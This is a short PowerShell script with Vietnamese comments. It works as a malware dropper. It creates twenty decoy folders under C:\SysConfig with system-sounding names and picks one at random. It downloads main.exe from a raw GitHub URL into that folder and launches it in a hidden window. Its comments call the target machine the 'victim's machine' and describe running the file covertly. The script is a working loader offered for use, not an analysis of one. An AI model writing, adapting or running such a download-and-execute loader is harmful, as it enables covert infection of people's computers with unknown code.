$d = 'C:\SysConfig'
md $d -Force | Out-Null
$n = 'SysLog','NetSec','DataVault','CoreAuth','WinAudit'
1..20 | ForEach-Object {
    $r = $n[(Get-Random -Max 5)] + $_
    $p = Join-Path $d $r
    md $p -Force | Out-Null
    'sys' | Out-File ($p + '\info.txt')
    'log' | Out-File ($p + '\config.dat')
}

# Chọn ngẫu nhiên 1 thư mục và lưu vào file .ptr
$tgt = Join-Path $d ($n[(Get-Random -Max 5)] + (Get-Random -Min 1 -Max 21))
$tgt | Out-File "$d\.ptr"

# Đọc file .ptr và xóa khoảng trắng/xuống dòng thừa
$ptr = (Get-Content "$d\.ptr").Trim()

# Đường dẫn file đích lưu trên máy nạn nhân
$t = Join-Path $ptr 'main.exe'

# Bật TLS 1.2 để tải file từ Github
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# LINK RAW CHUẨN CỦA BẠN ĐÂY:
$url = 'https://raw.githubusercontent.com/honggiabao2911/a/main/main.exe'

# Tải file về (dùng -OutFile)
iwr $url -OutFile $t -UseBasicParsing

# Đợi 2 giây cho file ghi xuống ổ cứng hoàn tất
Start-Sleep -s 2

# Chạy file ngầm
if (Test-Path $t) {
    Start-Process $t -WindowStyle Hidden
}

# Xóa file .ptr
Remove-Item "$d\.ptr" -Force